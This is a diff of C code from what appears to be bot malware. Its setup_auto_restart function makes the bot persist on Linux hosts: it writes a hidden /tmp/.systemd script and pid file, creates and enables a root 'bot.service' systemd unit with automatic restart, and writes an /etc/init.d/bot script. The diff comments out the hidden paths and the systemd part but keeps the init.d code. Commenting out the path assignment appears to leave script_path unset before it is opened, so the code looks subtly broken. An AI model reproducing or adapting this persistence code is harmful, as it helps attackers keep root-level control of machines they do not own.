@@ -771,9 +771,9 @@ static void setup_auto_restart(void)
     }
     binary_path[sizeof(binary_path) - 1] = 0;
     
-    // Create startup script paths
-    strcpy(script_path, "/tmp/.systemd");
-    strcpy(pid_file, "/tmp/.systemd.pid");
+    // // Create startup script paths
+    // strcpy(script_path, "/tmp/.systemd");
+    // strcpy(pid_file, "/tmp/.systemd.pid");
     
     // Create startup script
     fd = open(script_path, O_CREAT | O_WRONLY | O_TRUNC, 0755);
@@ -802,34 +802,34 @@ static void setup_auto_restart(void)
     }
     
     // Create systemd service (if systemd is available)
-    fd = open("/etc/systemd/system/bot.service", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-    if (fd >= 0) {
-        char service_content[512];
-        snprintf(service_content, sizeof(service_content),
-            "[Unit]\n"
-            "Description=System Bot Service\n"
-            "After=network.target\n"
-            "\n"
-            "[Service]\n"
-            "Type=simple\n"
-            "ExecStart=%s\n"
-            "Restart=always\n"
-            "RestartSec=10\n"
-            "User=root\n"
-            "\n"
-            "[Install]\n"
-            "WantedBy=multi-user.target\n",
-            binary_path);
+    // fd = open("/etc/systemd/system/bot.service", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    // if (fd >= 0) {
+    //     char service_content[512];
+    //     snprintf(service_content, sizeof(service_content),
+    //         "[Unit]\n"
+    //         "Description=System Bot Service\n"
+    //         "After=network.target\n"
+    //         "\n"
+    //         "[Service]\n"
+    //         "Type=simple\n"
+    //         "ExecStart=%s\n"
+    //         "Restart=always\n"
+    //         "RestartSec=10\n"
+    //         "User=root\n"
+    //         "\n"
+    //         "[Install]\n"
+    //         "WantedBy=multi-user.target\n",
+    //         binary_path);
         
-        write(fd, service_content, strlen(service_content));
-        close(fd);
+    //     write(fd, service_content, strlen(service_content));
+    //     close(fd);
         
-        // Enable the service
-        if (fork() == 0) {
-            execl("/bin/systemctl", "systemctl", "enable", "bot.service", NULL);
-            exit(0);
-        }
-    }
+    //     // Enable the service
+    //     if (fork() == 0) {
+    //         execl("/bin/systemctl", "systemctl", "enable", "bot.service", NULL);
+    //         exit(0);
+    //     }
+    // }
     
     // Create init.d script for older systems
     fd = open("/etc/init.d/bot", O_CREAT | O_WRONLY | O_TRUNC, 0755);
